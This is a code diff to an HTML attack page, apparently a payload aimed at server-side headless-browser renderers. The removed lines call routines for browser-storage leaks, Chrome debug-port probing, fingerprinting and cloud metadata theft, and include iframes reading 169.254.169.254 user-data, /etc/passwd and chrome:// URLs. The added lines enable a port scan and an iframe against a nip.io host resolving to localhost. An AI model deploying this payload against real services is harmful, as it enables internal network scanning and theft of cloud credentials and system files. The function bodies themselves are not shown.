@@ -132,27 +132,26 @@ function makeRequest(url, method, headers) {
 }
 
 //Log Javascript enabled and triggered
-log('Triggered in ' + window.location.href);
+//log('Triggered in ' + window.location.href);
 
 //Browser Storage Leak
-localStorageLeak();
+//localStorageLeak();
 
 //Try to fetch Chrome Headless debug port
-chromeHeadless();
+//chromeHeadless();
 
 //Get browser information (Plugins, versions, etc ...)
-getBrowserInfo();
+//getBrowserInfo();
 
 //GET Cloud metadata information
-cloudMetadata(googleMetadataServer, googleMetadataPaths, googleHeaders);
+//cloudMetadata(googleMetadataServer, googleMetadataPaths, googleHeaders);
 
 //Local port scanner
-//portScanner("127.0.0.1", communPorts);
+portScanner("company.127.0.0.1.nip.io", communPorts);
 
 </script>
-<iframe src="http://169.254.169.254/user-data">
-<iframe src="file://etc//passwd">
-	<iframe src="chrome://chrome-urls">
+<iframe src="http://company.127.0.0.1.nip.io">
+
 	
 </body>
 </html>
